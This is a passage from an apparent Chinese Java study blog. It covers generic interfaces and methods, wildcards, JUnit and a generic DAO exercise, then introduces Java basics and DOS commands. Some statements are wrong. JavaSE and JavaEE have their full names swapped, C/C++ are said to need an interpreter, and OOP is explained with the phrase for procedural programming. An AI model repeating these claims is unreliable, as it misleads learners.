class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">(Double aDouble)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(Double r1, Double r2, String u1, String u2)</span> &#123;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//实现接口时，直接指定泛型接口的类型</span><br><span class="hljs-comment">//给U 指定Integer 给 R 指定了 Float</span><br><span class="hljs-comment">//所以，当我们实现IUsb方法时，会使用Integer替换U，使用Float替换R</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUsb</span>&lt;Integer,Float&gt;&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Float <span class="hljs-title function_">get</span><span class="hljs-params">(Integer integer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">(Float aFloat)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(Float r1, Float r2, Integer u1, Integer u2)</span> &#123;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//没有指定类型，默认Object</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CC</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUsb</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">(Object o)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(Object r1, Object r2, Object u1, Object u2)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><h4 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">修饰符 ＜T，R..＞ 返回类型 方法名（参数列表）｛<br>｝<br></code></pre></td></tr></table></figure><h4 id="注意细节-1"><a href="#注意细节-1" class="headerlink" title="注意细节"></a>注意细节</h4><ol><li>泛型方法，可以定义在普通类中，也可以定义在泛型类 中</li><li>当泛型方法被调用时，类型会确定</li><li>public void eat(E e){}，修饰符后没有&lt;T，R..&gt;eat方法不是泛型方法，而是使用了泛型</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Car</span> <span class="hljs-variable">car</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>();<br>        car.fly(<span class="hljs-string">&quot;宝马&quot;</span>,<span class="hljs-number">100</span>); <span class="hljs-comment">//调用方法时，传入参数，编译器会确定类型</span><br><br>        <span class="hljs-comment">//测试</span><br>        <span class="hljs-comment">//T-&gt;String, R-&gt;ArrayList</span><br>        Fish&lt;String, ArrayList&gt; fish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fish</span>&lt;&gt;();<br>        fish.hello(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(),<span class="hljs-number">11.3f</span>);<br>        <span class="hljs-comment">//class java.util.ArrayList  class java.lang.Float</span><br>    &#125;<br><span class="hljs-comment">//泛型方法，可以定义在普通类中，也可以定义在泛型类中</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>&#123; <span class="hljs-comment">//普通类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//普通方法</span><br>    &#125;<br>    <span class="hljs-comment">//说明</span><br>    <span class="hljs-comment">//1.&lt;T,R&gt;就是泛型</span><br>    <span class="hljs-comment">//2.是提供给fly使用的</span><br>    <span class="hljs-keyword">public</span> &lt;T,R&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">(T t,R r)</span>&#123; <span class="hljs-comment">//泛型方法</span><br>        System.out.println(t.getClass());<br>        System.out.println(r.getClass());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fish</span>&lt;T,R&gt;&#123; <span class="hljs-comment">//泛型类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//普通方法</span><br>    &#125;<br>    <span class="hljs-keyword">public</span>&lt;U,M&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(U u,M m)</span>&#123; <span class="hljs-comment">//泛型方法</span><br>    &#125;<br>    <span class="hljs-comment">// 下面的hi（）不是泛型方法</span><br>    <span class="hljs-comment">// 而是方法使用了类声明的泛型</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">(T t)</span>&#123;&#125;<br>    <span class="hljs-comment">//泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型</span><br>    <span class="hljs-keyword">public</span>&lt;K&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(R r,K k)</span>&#123;<br>        System.out.println(r.getClass());<br>        System.out.println(k.getClass());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>练习</p><blockquote><p>下面的代码是否正确，如果有错误，修改正确，并说明输出什么</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230312155028492.png" alt="image-20230312155028492"></p></blockquote><p>是否有错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span>&lt;T, R, M&gt; &#123;<br>    <span class="hljs-keyword">public</span> &lt;E&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">(E e)</span> &#123; <span class="hljs-comment">//泛型方法</span><br>        System.out.println(e.getClass().getSimpleName());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(U u)</span> &#123;&#125; <span class="hljs-comment">//错误，U没有声明</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(M m)</span> &#123;&#125; <span class="hljs-comment">//ok</span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Apple&lt;String, Integer, Double&gt; apple = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>&lt;&gt;();<br>apple.fly(<span class="hljs-number">10</span>); <span class="hljs-comment">//10 会被自动装箱 Integer10  //Integer</span><br>apple.fly(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()); <span class="hljs-comment">//Dog</span><br></code></pre></td></tr></table></figure><h2 id="5-泛型的继承和通配符"><a href="#5-泛型的继承和通配符" class="headerlink" title="5.泛型的继承和通配符"></a>5.泛型的继承和通配符</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>1）泛型<strong>不具备继承性</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list ＝ <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;()；<span class="hljs-comment">//会报错</span><br></code></pre></td></tr></table></figure><p>2） &lt;?&gt;：支持<strong>任意泛型</strong>类型</p><p>3） ＜？ extends A＞：支持A类以及A类的<strong>子类</strong>，<strong>规定了泛型的上限</strong></p><p>4） ＜？ super A＞： 支持A类以及A类的<strong>父类</strong>，不限于直接父类，<strong>规定了泛型的下限</strong></p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a><strong>案例</strong></h3><p>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CC</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编写几个方法</span><br><span class="hljs-comment">//说明：List&lt;?&gt; 任意泛型都可以接受</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollection1</span><span class="hljs-params">(List&lt;?&gt; c)</span> &#123;<br>    <span class="hljs-keyword">for</span>(Object object : c)&#123; <span class="hljs-comment">//通配符，取出时，就是Object</span><br>        System.out.println(object);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//?extends AA 表示 上限，可以接受 AA或者AA子类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollection2</span><span class="hljs-params">(List&lt;? extends AA&gt; c)</span> &#123;<br>    <span class="hljs-keyword">for</span>(Object object : c)&#123;<br>        System.out.println(object);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//?super 子类类名AA；支持AA类以及AA类的父类，不限于直接父类，</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollection3</span><span class="hljs-params">(List&lt;? <span class="hljs-built_in">super</span> AA&gt; c)</span> &#123;<br>    <span class="hljs-keyword">for</span>(Object object : c)&#123;<br>        System.out.println(object);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//举例说明下面三个方法的使用</span><br>List&lt;Object&gt; list1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>List&lt;String&gt; list2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>List&lt;AA&gt; list3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>List&lt;BB&gt; list4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>List&lt;CC&gt; list5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br><span class="hljs-comment">//如果List&lt;?&gt; c, 可以接受任意的泛型类型</span><br>printCollection1(list1);<br>printCollection1(list2);<br>printCollection1(list3);<br>printCollection1(list4);<br>printCollection1(list5);<br><br><span class="hljs-comment">//List&lt;?extends AA&gt; 可以接受 AA或者AA子类</span><br>printCollection2(list1); <span class="hljs-comment">//错误，类型为Object，不符合要求</span><br>printCollection2(list2); <span class="hljs-comment">//错误</span><br>printCollection2(list3); <span class="hljs-comment">//正确</span><br>printCollection2(list4); <span class="hljs-comment">//正确</span><br>printCollection2(list5); <span class="hljs-comment">//正确</span><br><br><span class="hljs-comment">//List&lt;?super 子类类名AA&gt;；支持AA类以及AA类的父类，不限于直接父类，</span><br>printCollection3(list1); <span class="hljs-comment">//正确</span><br>printCollection3(list2); <span class="hljs-comment">//错误</span><br>printCollection3(list3); <span class="hljs-comment">//正确</span><br>printCollection3(list4); <span class="hljs-comment">//错误</span><br>printCollection3(list5); <span class="hljs-comment">//错误</span><br></code></pre></td></tr></table></figure><h2 id="JUnit"><a href="#JUnit" class="headerlink" title="JUnit"></a>JUnit</h2><p><strong>为什么需要JUnit?</strong></p><p>1.一个类有很多功能代码需要测试，为了测试，就需要写入到main方法中</p><p>2.如果有多个功能代码测试，就需要来回注销，切换很麻烦</p><p>3.如果可以直接运行一个方法，就方便很多，并且可以给出相关信息，就好了－＞JUnit</p><p><strong>基本介绍</strong></p><ul><li>JUnit是一个Java语言的单元测试框架</li><li>多数Java的开发环境都已经集成了JUnit作为单元测试的工具</li></ul><p><strong>快捷键：⌥+enter （win：control+enter）</strong></p><h2 id="本章作业-3"><a href="#本章作业-3" class="headerlink" title="本章作业"></a>本章作业</h2><h3 id="编程题1"><a href="#编程题1" class="headerlink" title="编程题1"></a>编程题1</h3><blockquote><p>定义个泛型类DAO＜T＞，在其中定义一个Map成员变量，Map 的键为String 类型，值为T类型。<br>分别创建以下方法：<br>（1） public void save（String id，T entity）：保存T类型的对象到 Map成员变量中<br>（2） public T get（String id）： 从 map 中获取 id 对应的对象<br>（3） public void update（String id，T entity）：替换 map 中key为id的内容，改为 entity 对象（4） public List＜T＞ list（）：返回 map 中存放的所有T对象<br>（5） public void delete（String id）：删除指定 id 对象</p><p>定义一个User类:<br>该类包含:private成员变量（int类型） id，age；（String 类型）name。</p><p>创建 DAO 类的对象，分别调用其save、get、update、list、delete 方法来操作 User对象，使用 Junit 单元测试类进行测试。</p></blockquote><p>User类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><span class="hljs-comment">/**省略get、set、tostring、构造器**/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Dao类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DAO</span>&lt;T&gt;&#123;<br>    <span class="hljs-keyword">private</span> Map&lt;String,T&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(String id,T entity)</span>&#123;<br>        map.put(id,entity);<br>    &#125;<br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">get</span><span class="hljs-params">(String id)</span>&#123;<br>        <span class="hljs-keyword">return</span> map.get(id);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String id,T entity)</span>&#123;<br>        map.put(id,entity);<br>    &#125;<br>    <span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title function_">list</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//遍历</span><br>        <span class="hljs-comment">//先遍历map，再把value封装到ArrayList返回</span><br>        List&lt;T&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        Set&lt;String&gt; keys = map.keySet();<br>        <span class="hljs-keyword">for</span> (String key:keys) &#123;<br>            list.add(get(key));<br>        &#125;<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(String id)</span>&#123;<br>        map.remove(id);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Test:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testList</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//创建 DAO 类的对象，</span><br>    <span class="hljs-comment">// 分别调用其save、get、update、list、delete 方法来操作 User对象，</span><br>    <span class="hljs-comment">// 使用 Junit 单元测试类进行测试。</span><br>    DAO&lt;Object&gt; dao = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DAO</span>&lt;&gt;();<br>    dao.save(<span class="hljs-string">&quot;1001&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1001</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;john&quot;</span>));<br>    dao.save(<span class="hljs-string">&quot;1002&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1002</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&quot;tom&quot;</span>));<br>    dao.save(<span class="hljs-string">&quot;1003&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1003</span>,<span class="hljs-number">17</span>,<span class="hljs-string">&quot;king&quot;</span>));<br>    List&lt;Object&gt; list = dao.list();<br>    System.out.println(<span class="hljs-string">&quot;list&quot;</span>+list);<br>    dao.update(<span class="hljs-string">&quot;1001&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1003</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&quot;smith&quot;</span>));<br>    list = dao.list();<br>    System.out.println(<span class="hljs-string">&quot;list&quot;</span>+list);<br>    dao.delete(<span class="hljs-string">&quot;1002&quot;</span>);<br>    list = dao.list();<br>    System.out.println(<span class="hljs-string">&quot;list&quot;</span>+list);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><blockquote><p>list[User{id&#x3D;1003, age&#x3D;17, name&#x3D;’king’}, User{id&#x3D;1002, age&#x3D;20, name&#x3D;’tom’}, User{id&#x3D;1001, age&#x3D;18, name&#x3D;’john’}]<br>list[User{id&#x3D;1003, age&#x3D;17, name&#x3D;’king’}, User{id&#x3D;1002, age&#x3D;20, name&#x3D;’tom’}, User{id&#x3D;1003, age&#x3D;22, name&#x3D;’smith’}]<br>list[User{id&#x3D;1003, age&#x3D;17, name&#x3D;’king’}, User{id&#x3D;1003, age&#x3D;22, name&#x3D;’smith’}]</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java基础——上</title>
    <link href="/2023/10/28/2023/java%E5%9F%BA%E7%A1%80%EF%BC%88%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%89/"/>
    <url>/2023/10/28/2023/java%E5%9F%BA%E7%A1%80%EF%BC%88%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>学习韩顺平老师在b站的免费课程。</p><p>就业方向：</p><p>javaee软件工程师</p><p>大数据软件工程师（大数据应用工程师、大数据算法工程师、大数据分析和挖掘）</p><p>android软件工程师</p><h1 id="如何快速学习技术或者知识点"><a href="#如何快速学习技术或者知识点" class="headerlink" title="如何快速学习技术或者知识点"></a>如何快速学习技术或者知识点</h1><p>一、需求：1.工作需要 2.跳槽 3.技术控</p><p>二、看看能否使用传统技术解决？</p><ol><li>能解决，但是不完美</li><li>解决不了</li></ol><p>三、引出我们学习的新技术和知识点</p><p>四、学习新技术或者知识点的基本原理和基本语法（不要死扣细节）</p><p>五、快速入门（基本程序，crud）</p><p>六、开始研究技术的注意事项、使用细节、使用规范、如何规划</p><h1 id="javaEE和javaSE"><a href="#javaEE和javaSE" class="headerlink" title="javaEE和javaSE"></a>javaEE和javaSE</h1><blockquote><p><strong>一、JavaSE</strong><br>JavaSE是指Java Enterprise Edition，Java标准版，就是一般Java程序的开发就可以，可以看做<strong>是JavaEE的子集</strong>。<br>它允许开发和部署在桌面、服务器、嵌入式环境和实时环境中使用的Java应用程序。<br>JavaSE包含了支持Java Web服务开发的类，并为JavaEE提供基础。</p><p><strong>二、JavaEE</strong><br>JavaEE通常是指Java Standard Edition，<strong>Java企业版</strong>，多用于企业级开发，包括Web开发等等。<br>JavaEE是Java应用最广泛的部分。</p><p>企业版本帮助开发和部署可移植、健壮、可伸缩切安全的服务端Java应用。Java EE是在JavaSE的基础上构建的他提供Web 服务、组建模型、管理和通信API.可以用来实现企业级的面向服务体系结构(service-oriented architecture,SOA)和web2.0应用程序。</p></blockquote><h1 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a>java基础</h1><h1 id="——基础——"><a href="#——基础——" class="headerlink" title="——基础——"></a>——基础——</h1><h1 id="章节一"><a href="#章节一" class="headerlink" title="章节一"></a>章节一</h1><p>1995年，sun正式发布java第一个版本。</p><p>2009年，甲骨文公司收购sun。</p><p>java之父詹姆斯·高斯林</p><p><strong>java技术体系平台</strong></p><ul><li><p>javase标准版——面向桌面级应用</p></li><li><p>javaee企业版——为开发企业环境下的应用程序提供的一套解决方案</p></li><li><p>javame小型版——支持java程序运行在移动终端（手机、pda）上的平台</p></li></ul><p><strong>java特点</strong></p><ul><li><p>java语言是<strong>面向对象（oop）的</strong></p><ul><li>通俗理解oop：面向过程编程的核心，就是把要做的事拆成若干个小部分，然后依次让你的对象替你完成各个过程。</li></ul></li><li><p>java语言是<strong>健壮的</strong>（强类型机制、异常处理垃圾的自动收集等）</p></li><li><p>java语言是<strong>跨平台性</strong>的</p></li><li><p>java语言是<strong>解释型</strong>的</p><ul><li>解释型语言：JavaScript、php、java</li><li>编译型语言（需要解释器）：c&#x2F;c++</li></ul></li></ul><p><strong>jvm</strong>（java虚拟机）——实现了java程序的跨平台</p><ul><li><p>具有指令集并使用不同的存储区域。负责执行指令，管理数据、内存、寄存器，<strong>包含在jdk中</strong>。</p></li><li><p>不同的平台有不同的虚拟机</p></li><li><p>java虚拟机机制屏蔽了底层运行平台的差别</p></li></ul><p><strong>jdk（java development kit java开发工具包）</strong></p><ul><li>jdk&#x3D;jre+java的开发工具</li><li>供给java开发人员使用</li></ul><p><strong>jre（java runtime environment java运行环境）</strong></p><ul><li>jre&#x3D;jvm+java核心类库</li></ul><p><strong>JDK、JRE和JVM的关系</strong></p><ol><li>JDK &#x3D; JRE + 开发工具集（例如javac、java编译工具等）</li><li>JRE &#x3D; JVM + Java SE标准类库（java核心类库）</li><li>JDK &#x3D; JVM + Java SE标准类库 + 开发工具集</li><li>如果指向运行开发好的.class 只需要JRE</li></ol><h2 id="1-第一个程序helloworld"><a href="#1-第一个程序helloworld" class="headerlink" title="1.第一个程序helloworld"></a>1.第一个程序helloworld</h2><p>hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><span class="hljs-comment">//编写一个main方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;hello,world~&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件名必须和public类名相同。</p><p>一个源文件可以有多个类，但只能有一个public类。</p><h2 id="2-常用符号"><a href="#2-常用符号" class="headerlink" title="2.常用符号"></a>2.常用符号</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">\t 制表符<br>\n 换行<br>\\ 转义<br><span class="hljs-comment">// 单行注释</span><br><span class="hljs-comment">/* 多行注释 */</span><br><br></code></pre></td></tr></table></figure><p>文档注释：javadoc -d 文件夹名 -xx -yy xxx.java</p><h2 id="3-dos基本原理"><a href="#3-dos基本原理" class="headerlink" title="3.dos基本原理"></a>3.dos基本原理</h2><p>Dos:disk operating system 磁盘操作系统</p><p>流程</p><ol><li>结束指令</li><li>解析指令</li><li>执行指令</li></ol><p><strong>常用命令</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">1</span>.查看当前目录：<span class="hljs-built_in">dir</span><br><span class="hljs-number">2</span>.切换盘：<span class="hljs-built_in">cd</span> c:<br><span class="hljs-number">3</span>.切换到上一级：<span class="hljs-built_in">cd</span> ..<br><span class="hljs-number">4</span>.切换到根目录：<span class="hljs-built_in">cd</span> \<br><span class="hljs-number">5</span>.查看目录下所有子级目录：<span class="hljs-built_in">tree</span><br><span class="hljs-number">6</span>.清屏：<span class="hljs-built_in">cls</span><br><span class="hljs-number">7</span>.退出：<span class="hljs-keyword">exit</span><br><br>创建目录：<span class="hljs-built_in">md</span><br>删除目录：<span class="hljs-built_in">rd</span><br>拷贝文件：<span class="hljs-built_in">copy</span><br>删除文件：<span 